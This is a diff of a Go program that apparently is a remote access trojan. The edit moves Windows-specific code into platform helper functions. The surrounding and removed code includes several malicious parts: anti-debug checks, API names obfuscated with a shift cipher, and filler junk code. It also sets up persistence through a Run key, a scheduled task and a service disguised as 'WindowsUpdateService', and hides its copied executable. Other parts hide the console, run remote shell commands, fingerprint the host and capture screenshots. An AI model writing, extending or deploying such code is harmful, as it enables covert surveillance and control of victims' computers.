@@ -173,16 +173,7 @@ func junkHeavy() {
 
 // Basic debug check (VM/sandbox detection removed)
 func checkDebug() bool {
-	// Only check for debugger presence on Windows
-	if runtime.GOOS == "windows" {
-		kernelLibLoad := syscall.NewLazyDLL(shiftDecrypt(kernelLib))
-		debugProc := kernelLibLoad.NewProc(shiftDecrypt(debugCheckProc))
-		ret, _, _ := debugProc.Call()
-		if ret != 0 {
-			return true
-		}
-	}
-	return false
+	return platformCheckDebug()
 }
 
 func createLock() bool {
@@ -232,7 +223,7 @@ func createLockWithPrefix(prefix string) bool {
 
 			if runtime.GOOS == "windows" {
 				cmd := exec.Command("tasklist", "/FI", fmt.Sprintf("PID eq %d", os.Getpid()), "/FO", "CSV", "/NH")
-				cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: noWindowFlag}
+				setHiddenWindow(cmd)
 				output, err := cmd.Output()
 				if err != nil || len(output) == 0 || strings.Contains(string(output), "INFO: No tasks") {
 					os.Remove(lockPath)
@@ -306,7 +297,7 @@ func isRunningWithPrefix(prefix string) bool {
 
 		if runtime.GOOS == "windows" {
 			cmd := exec.Command("tasklist", "/FI", fmt.Sprintf("PID eq %d", pid), "/FO", "CSV", "/NH")
-			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: noWindowFlag}
+			setHiddenWindow(cmd)
 			output, err := cmd.Output()
 			if err == nil && len(output) > 0 && !strings.Contains(string(output), "INFO: No tasks") {
 				return true
@@ -338,29 +329,7 @@ type Resp struct {
 }
 
 func hideTerminal() {
-	if runtime.GOOS != "windows" {
-		return
-	}
-
-	kernelLibLoad := syscall.NewLazyDLL(shiftDecrypt(kernelLib))
-	userLibLoad := syscall.NewLazyDLL(shiftDecrypt(userLib))
-
-	proc := kernelLibLoad.NewProc(shiftDecrypt(getWindowProc))
-	hwnd, _, _ := proc.Call()
-
-	if hwnd != 0 {
-		showProc := userLibLoad.NewProc(shiftDecrypt(showWindowProc))
-		showProc.Call(hwnd, uintptr(hideFlag))
-	}
-
-	proc = kernelLibLoad.NewProc("FreeConsole")
-	proc.Call()
-
-	proc = kernelLibLoad.NewProc("SetPriorityClass")
-	proc.Call(uintptr(os.Getpid()), 0x00004000)
-	// Add junk code
-	_ = time.Now().UnixNano() % 100
-	_ = hashString("hide_junk")
+	platformHideTerminal()
 }
 
 func makeCopy() string {
@@ -435,7 +404,7 @@ const (
 // regQueryValueOutput runs reg query and returns stdout (empty if missing).
 func regQueryValueOutput(name string) string {
 	cmd := exec.Command("reg", "query", persistHKCURunKey, "/v", name)
-	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: noWindowFlag}
+	setHiddenWindow(cmd)
 	out, err := cmd.Output()
 	if err != nil {
 		return ""
@@ -453,7 +422,7 @@ func writeHKCUScServiceRun(target string) {
 		regData = `"` + target + `"`
 	}
 	cmd := exec.Command("reg", "add", persistHKCURunKey, "/v", persistRegName, "/t", "REG_SZ", "/d", regData, "/f")
-	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: noWindowFlag}
+	setHiddenWindow(cmd)
 	_ = cmd.Run()
 }
 
@@ -536,7 +505,7 @@ func persistExeForRunKey(absExe string) string {
 			continue
 		}
 		cmd := exec.Command("attrib", "+h", "+s", dest)
-		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: noWindowFlag}
+		setHiddenWindow(cmd)
 		_ = cmd.Run()
 		return dest
 	}
@@ -660,22 +629,22 @@ func cleanLegacyWindowsPersistenceArtifacts() {
 		return
 	}
 	cmd := exec.Command("schtasks", "/delete", "/tn", "WindowsUpdateService", "/f")
-	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: noWindowFlag}
+	setHiddenWindow(cmd)
 	_ = cmd.Run()
 	// Legacy Run names from older builds (do not delete ScService — we use it now)
 	for _, v := range []string{"WindowsUpdateService", "WindowsUpdate"} {
 		cmd = exec.Command("reg", "delete", persistHKCURunKey, "/v", v, "/f")
-		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: noWindowFlag}
+		setHiddenWindow(cmd)
 		_ = cmd.Run()
 	}
 	startupFile := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "WindowsUpdateService.bat")
 	_ = os.Remove(startupFile)
 	cmd = exec.Command("sc", "stop", "WindowsUpdateService")
-	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: noWindowFlag}
+	setHiddenWindow(cmd)
 	_ = cmd.Run()
 	time.Sleep(400 * time.Millisecond)
 	cmd = exec.Command("sc", "delete", "WindowsUpdateService")
-	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: noWindowFlag}
+	setHiddenWindow(cmd)
 	_ = cmd.Run()
 }
 
@@ -689,13 +658,13 @@ func removePersistence() {
 	if runtime.GOOS == "windows" {
 		// Remove scheduled task
 		cmd := exec.Command("schtasks", "/delete", "/tn", "WindowsUpdateService", "/f")
-		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: noWindowFlag}
+		setHiddenWindow(cmd)
 		_ = cmd.Run()
 
 		// Remove registry entries (current + legacy)
 		for _, v := range []string{persistRegName, "WindowsUpdateService", "WindowsUpdate"} {
 			cmd = exec.Command("reg", "delete", persistHKCURunKey, "/v", v, "/f")
-			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: noWindowFlag}
+			setHiddenWindow(cmd)
 			_ = cmd.Run()
 		}
 
@@ -706,11 +675,11 @@ func removePersistence() {
 
 		// Remove service
 		cmd = exec.Command("sc", "stop", "WindowsUpdateService")
-		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: noWindowFlag}
+		setHiddenWindow(cmd)
 		_ = cmd.Run()
 
 		cmd = exec.Command("sc", "delete", "WindowsUpdateService")
-		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: noWindowFlag}
+		setHiddenWindow(cmd)
 		_ = cmd.Run()
 	} else {
 		// Remove from crontab
@@ -1044,7 +1013,7 @@ func getHostname() string {
 func getMACAddress() string {
 	if runtime.GOOS == "windows" {
 		cmd := exec.Command("getmac", "/fo", "csv", "/nh")
-		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: noWindowFlag}
+		setHiddenWindow(cmd)
 		output, err := cmd.Output()
 		if err == nil {
 			lines := strings.Split(string(output), "\n")
@@ -1061,7 +1030,7 @@ func getMACAddress() string {
 			}
 		}
 		cmd = exec.Command("ipconfig", "/all")
-		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: noWindowFlag}
+		setHiddenWindow(cmd)
 		output, err = cmd.Output()
 		if err == nil {
 			lines := strings.Split(string(output), "\n")
@@ -1109,7 +1078,7 @@ func getUsername() string {
 	if username == "" {
 		if runtime.GOOS == "windows" {
 			cmd := exec.Command("cmd", "/c", "echo %USERNAME%")
-			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: noWindowFlag}
+			setHiddenWindow(cmd)
 			output, err := cmd.Output()
 			if err == nil {
 				username = strings.TrimSpace(string(output))
@@ -1146,7 +1115,7 @@ func runCommand(command string) string {
 	var cmd *exec.Cmd
 	if runtime.GOOS == "windows" {
 		cmd = exec.Command("cmd", "/c", command)
-		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: noWindowFlag}
+		setHiddenWindow(cmd)
 	} else {
 		cmd = exec.Command("nohup", "sh", "-c", command)
 	}
@@ -1211,57 +1180,7 @@ func runCommandWithChunks(command string, conn net.Conn) {
 }
 
 func takeSnapshot() string {
-	if runtime.GOOS != "windows" {
-		return "Snapshot only supported on Windows"
-	}
-	userLibLoad := syscall.NewLazyDLL(shiftDecrypt(userLib))
-	gdiLibLoad := syscall.NewLazyDLL(shiftDecrypt(gdiLib))
-	metricsProc := userLibLoad.NewProc(shiftDecrypt(getMetricsProc))
-	width, _, _ := metricsProc.Call(0)
-	height, _, _ := metricsProc.Call(1)
-	dcProc := userLibLoad.NewProc(shiftDecrypt(getDCProc))
-	dc, _, _ := dcProc.Call(0)
-	compatDCProc := gdiLibLoad.NewProc(shiftDecrypt(createDCProc))
-	memDC, _, _ := compatDCProc.Call(dc)
-	compatBitmapProc := gdiLibLoad.NewProc(shiftDecrypt(createBitmapProc))
-	bitmap, _, _ := compatBitmapProc.Call(dc, width, height)
-	selectProc := gdiLibLoad.NewProc(shiftDecrypt(selectObjProc))
-	selectProc.Call(memDC, bitmap)
-	copyProc := gdiLibLoad.NewProc(shiftDecrypt(bitCopyProc))
-	copyProc.Call(memDC, 0, 0, width, height, dc, 0, 0, uintptr(copyFlag))
-	filename := fmt.Sprintf("snapshot_%d.bmp", time.Now().Unix())
-	currentDir, err := os.Getwd()
-	if err != nil {
-		currentDir = "."
-	}
-	fullPath := filepath.Join(currentDir, filename)
-	openClipProc := userLibLoad.NewProc(shiftDecrypt(openClipProc))
-	emptyClipProc := userLibLoad.NewProc(shiftDecrypt(emptyClipProc))
-	setClipProc := userLibLoad.NewProc(shiftDecrypt(setClipProc))
-	closeClipProc := userLibLoad.NewProc(shiftDecrypt(closeClipProc))
-	openClipProc.Call(0)
-	emptyClipProc.Call()
-	setClipProc.Call(uintptr(bitmapFlag), bitmap)
-	closeClipProc.Call()
-	batchContent := fmt.Sprintf(`@echo off
-powershell -Command "Add-Type -AssemblyName System.Windows.Forms; $clipboard = [System.Windows.Forms.Clipboard]::GetImage(); if ($clipboard) { $clipboard.Save('%s', [System.Drawing.Imaging.ImageFormat]::Bmp); Write-Host 'Snapshot saved successfully' } else { Write-Host 'Failed to capture snapshot' }"`, fullPath)
-	batchPath := filepath.Join(os.TempDir(), "snapshot.bat")
-	err = os.WriteFile(batchPath, []byte(batchContent), 0644)
-	if err != nil {
-		return fmt.Sprintf("Failed to create snapshot script: %v", err)
-	}
-	cmd := exec.Command("cmd", "/c", batchPath)
-	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: noWindowFlag}
-	cmd.Run()
-	os.Remove(batchPath)
-	delObjProc := gdiLibLoad.NewProc(shiftDecrypt(deleteObjProc))
-	delDCProc := gdiLibLoad.NewProc(shiftDecrypt(deleteDCProc))
-	relDCProc := userLibLoad.NewProc(shiftDecrypt(releaseDCProc))
-	delObjProc.Call(bitmap)
-	delDCProc.Call(memDC)
-	relDCProc.Call(0, dc)
-	_ = hashString("snapshot_junk")
-	return fmt.Sprintf("Snapshot saved as: %s", fullPath)
+	return platformTakeSnapshot()
 }
 
 func changeDir(path string) string {
